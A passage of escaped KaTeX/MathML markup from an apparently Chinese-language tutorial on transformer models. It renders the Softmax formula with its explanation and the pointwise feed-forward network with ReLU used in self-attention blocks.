separator=\"true\">,</mo><msub><mi>z</mi><mi>n</mi></msub><mo stretchy=\"false\">]</mo><mtext>,Softmax函数将其转换为一个概率向量</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi mathvariant=\"bold\">p</mi><mo>=</mo><mo stretchy=\"false\">[</mo><msub><mi>p</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><msub><mi>p</mi><mn>2</mn></msub><mo separator=\"true\">,</mo><mo>…</mo><mo separator=\"true\">,</mo><msub><mi>p</mi><mi>n</mi></msub><mo stretchy=\"false\">]</mo><mtext>,其中每个元素 </mtext><msub><mi>p</mi><mi>i</mi></msub><mtext> 表示该位置对应的类别的概率,计算公式</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>如下</mtext><mo>:</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msub><mi>p</mi><mi>i</mi></msub><mo>=</mo><mfrac><mrow><mi>exp</mi><mo>⁡</mo><mo stretchy=\"false\">(</mo><msub><mi>z</mi><mi>i</mi></msub><mo stretchy=\"false\">)</mo></mrow><mrow><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mi>exp</mi><mo>⁡</mo><mo stretchy=\"false\">(</mo><msub><mi>z</mi><mi>j</mi></msub><mo stretchy=\"false\">)</mo></mrow></mfrac><mo separator=\"true\">,</mo><mspace width=\"1em\"/><mrow><mi mathvariant=\"normal\">f</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">r</mi><mtext> </mtext></mrow><mi>i</mi><mo>=</mo><mn>1</mn><mo separator=\"true\">,</mo><mn>2</mn><mo separator=\"true\">,</mo><mo>…</mo><mo separator=\"true\">,</mo><mi>n</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>其中:</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>∙</mo><mspace width=\"1em\"/><mi>exp</mi><mo>⁡</mo><mo stretchy=\"false\">(</mo><msub><mi>z</mi><mi>i</mi></msub><mo stretchy=\"false\">)</mo><mtext> 是 </mtext><msub><mi>z</mi><mi>i</mi></msub><mtext> 的指数函数。</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>∙</mo><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mi>exp</mi><mo>⁡</mo><mo stretchy=\"false\">(</mo><msub><mi>z</mi><mi>j</mi></msub><mo stretchy=\"false\">)</mo><mtext> 是所有 </mtext><msub><mi>z</mi><mi>i</mi></msub><mtext> 指数函数值的总和,用于归一化。</mtext></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\n&amp;\\text{公式定义} \\\\\n&amp;\\text{给定一个实数向量 }\\mathbf{z}=[z_1,z_2,\\ldots,z_n]\\text{,Softmax函数将其转换为一个概率向量} \\\\\n&amp;\\mathbf{p}=[p_1,p_2,\\ldots,p_n]\\text{,其中每个元素 }p_i\\text{ 表示该位置对应的类别的概率,计算公式} \\\\\n&amp;如下: \\\\\n&amp;p_{i}=\\frac{\\exp(z_{i})}{\\sum_{j=1}^{n}\\exp(z_{j})},\\quad\\mathrm{for~}i=1,2,\\ldots,n \\\\\n&amp;\\text{其中:} \\\\\n&amp;\\bullet\\quad\\exp(z_i)\\text{ 是 }z_i\\text{ 的指数函数。} \\\\\n&amp;\\bullet\\sum_{j=1}^n\\exp(z_j)\\text{ 是所有 }z_i\\text{ 指数函数值的总和,用于归一化。}\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:15.222284000000004em;vertical-align:-7.361142000000002em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:7.861142000000002em;\"><span style=\"top:-10.672539000000002em;\"><span class=\"pstrut\" style=\"height:3.6513970000000007em;\"></span><span class=\"mord\"></span></span><span style=\"top:-9.172539000000002em;\"><span class=\"pstrut\" style=\"height:3.6513970000000007em;\"></span><span class=\"mord\"></span></span><span style=\"top:-7.672539000000002em;\"><span class=\"pstrut\" style=\"height:3.6513970000000007em;\"></span><span class=\"mord\"></span></span><span style=\"top:-6.172539000000002em;\"><span class=\"pstrut\" style=\"height:3.6513970000000007em;\"></span><span class=\"mord\"></span></span><span style=\"top:-4.085539000000002em;\"><span class=\"pstrut\" style=\"height:3.6513970000000007em;\"></span><span class=\"mord\"></span></span><span style=\"top:-1.8154290000000004em;\"><span class=\"pstrut\" style=\"height:3.6513970000000007em;\"></span><span class=\"mord\"></span></span><span style=\"top:-0.3154290000000004em;\"><span class=\"pstrut\" style=\"height:3.6513970000000007em;\"></span><span class=\"mord\"></span></span><span style=\"top:1.9959680000000013em;\"><span class=\"pstrut\" style=\"height:3.6513970000000007em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:7.361142000000002em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:7.861142000000002em;\"><span style=\"top:-10.672539000000002em;\"><span class=\"pstrut\" style=\"height:3.6513970000000007em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord cjk_fallback\">公式定义</span></span></span></span><span style=\"top:-9.172539000000002em;\"><span class=\"pstrut\" style=\"height:3.6513970000000007em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord cjk_fallback\">给定一个实数向量</span><span class=\"mord\"> </span></span><span class=\"mord\"><span class=\"mord mathbf\">z</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mopen\">[</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.04398em;\">z</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.04398em;\">z</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.04398em;\">z</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">]</span><span class=\"mord text\"><span class=\"mord\">,Softmax</span><span class=\"mord cjk_fallback\">函数将其转换为一个概率向量</span></span></span></span><span style=\"top:-7.672539000000002em;\"><span class=\"pstrut\" style=\"height:3.6513970000000007em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathbf\">p</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mopen\">[</span><span class=\"mord\"><span class=\"mord mathnormal\">p</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">p</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">p</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">]</span><span class=\"mord text\"><span class=\"mord\">,</span><span class=\"mord cjk_fallback\">其中每个元素</span><span class=\"mord\"> </span></span><span class=\"mord\"><span class=\"mord mathnormal\">p</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord text\"><span class=\"mord\"> </span><span class=\"mord cjk_fallback\">表示该位置对应的类别的概率</span><span class=\"mord\">,</span><span class=\"mord cjk_fallback\">计算公式</span></span></span></span><span style=\"top:-6.172539000000002em;\"><span class=\"pstrut\" style=\"height:3.6513970000000007em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord cjk_fallback\">如</span><span class=\"mord cjk_fallback\">下</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span></span></span><span style=\"top:-4.085539000000002em;\"><span class=\"pstrut\" style=\"height:3.6513970000000007em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathnormal\">p</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.427em;\"><span style=\"top:-2.305708em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mop\"><span class=\"mop op-symbol small-op\" style=\"position:relative;top:-0.0000050000000000050004em;\">∑</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.804292em;\"><span style=\"top:-2.40029em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"mrel mtight\">=</span><span class=\"mord mtight\">1</span></span></span></span><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.43581800000000004em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop\">exp</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.04398em;\">z</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mop\">exp</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.04398em;\">z</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.1301100000000002em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:1em;\"></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathrm\" style=\"margin-right:0.07778em;\">f</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">r</span><span class=\"mspace nobreak\"> </span></span><span class=\"mord mathnormal\">i</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">n</span></span></span><span style=\"top:-1.8154290000000004em;\"><span class=\"pstrut\" style=\"height:3.6513970000000007em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord cjk_fallback\">其中</span><span class=\"mord\">:</span></span></span></span><span style=\"top:-0.3154290000000004em;\"><span class=\"pstrut\" style=\"height:3.6513970000000007em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∙</span><span class=\"mspace\" style=\"margin-right:1em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mop\">exp</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.04398em;\">z</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mord text\"><span class=\"mord\"> </span><span class=\"mord cjk_fallback\">是</span><span class=\"mord\"> </span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.04398em;\">z</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord text\"><span class=\"mord\"> </span><span class=\"mord cjk_fallback\">的指数函数。</span></span></span></span><span style=\"top:1.9959680000000013em;\"><span class=\"pstrut\" style=\"height:3.6513970000000007em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∙</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.6513970000000007em;\"><span style=\"top:-1.872331em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"mrel mtight\">=</span><span class=\"mord mtight\">1</span></span></span></span><span style=\"top:-3.050005em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span><span style=\"top:-4.3000050000000005em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.4137769999999998em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop\">exp</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.04398em;\">z</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mord text\"><span class=\"mord\"> </span><span class=\"mord cjk_fallback\">是所有</span><span class=\"mord\"> </span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.04398em;\">z</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord text\"><span class=\"mord\"> </span><span class=\"mord cjk_fallback\">指数函数值的总和</span><span class=\"mord\">,</span><span class=\"mord cjk_fallback\">用于归一化。</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:7.361142000000002em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n</li>\n</ul>\n</li>\n<li>\n<p>应用逐点前馈网络赋予自注意力块非线性：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><msup><mi mathvariant=\"bold\">F</mi><mi>l</mi></msup><mo>=</mo><mo stretchy=\"false\">[</mo><mrow><mi mathvariant=\"normal\">F</mi><mi mathvariant=\"normal\">F</mi><mi mathvariant=\"normal\">N</mi></mrow><mo stretchy=\"false\">(</mo><msubsup><mi mathvariant=\"bold\">F</mi><mn>1</mn><mi>l</mi></msubsup><msup><mo stretchy=\"false\">)</mo><mi mathvariant=\"normal\">⊤</mi></msup><mo separator=\"true\">;</mo><mo>⋯</mo><mtext> </mtext><mo separator=\"true\">;</mo><mrow><mi mathvariant=\"normal\">F</mi><mi mathvariant=\"normal\">F</mi><mi mathvariant=\"normal\">N</mi></mrow><mo stretchy=\"false\">(</mo><msubsup><mi mathvariant=\"bold\">F</mi><mi>n</mi><mi>l</mi></msubsup><msup><mo stretchy=\"false\">)</mo><mi mathvariant=\"normal\">⊤</mi></msup><mo stretchy=\"false\">]</mo><mo separator=\"true\">,</mo><mspace linebreak=\"newline\"></mspace><mrow><mi mathvariant=\"normal\">F</mi><mi mathvariant=\"normal\">F</mi><mi mathvariant=\"normal\">N</mi></mrow><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mo stretchy=\"false\">(</mo><mrow><mi mathvariant=\"normal\">R</mi><mi mathvariant=\"normal\">e</mi><mi mathvariant=\"normal\">L</mi><mi mathvariant=\"normal\">U</mi></mrow><mo stretchy=\"false\">(</mo><mi>x</mi><msub><mi mathvariant=\"bold\">W</mi><mn>1</mn></msub><mo>+</mo><msub><mi mathvariant=\"bold\">b</mi><mn>1</mn></msub><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">)</mo><msub><mi mathvariant=\"bold\">W</mi><mn>2</mn></msub><mo>+</mo><msub><mi mathvariant=\"bold\">b</mi><mn>2</mn></msub><mo separator=\"true\">,</mo></mrow><annotation encoding=\"application/x-tex\">\\mathbf{F}^{l}=[\\mathrm{FFN}(\\mathbf{F}_{1}^{l})^{\\top};\\cdots;\\mathrm{FFN}(\\mathbf{F}_{n}^{l})^{\\top}],\\\\\\mathrm{FFN}(x)=(\\mathrm{ReLU}(x\\mathbf{W}_{1}+\\mathbf{b}_{1}))\\mathbf{W}_{2}+\\mathbf{b}_{2},\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8991079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">F</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8991079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.01968em;\">l</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.149108em;vertical-align:-0.25em;\"></span><span class=\"mopen\">[</span><span class=\"mord\"><span class=\"mord mathrm\">F</span><span class=\"mord mathrm\">F</span><span class=\"mord mathrm\">N</span></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">F</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8991079999999998em;\"><span style=\"top:-2.4530000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.01968em;\">l</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.247em;\"><span></span></span></span></span></span></span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8991079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">⊤</span></span></span></span></span></span></span></span></span><span class=\"mpunct\">;</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">⋯</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mpunct\">;</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathrm\">F</span><span class=\"mord mathrm\">F</span><span class=\"mord mathrm\">N</span></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">F</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8991079999999998em;\"><span style=\"top:-2.4530000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" 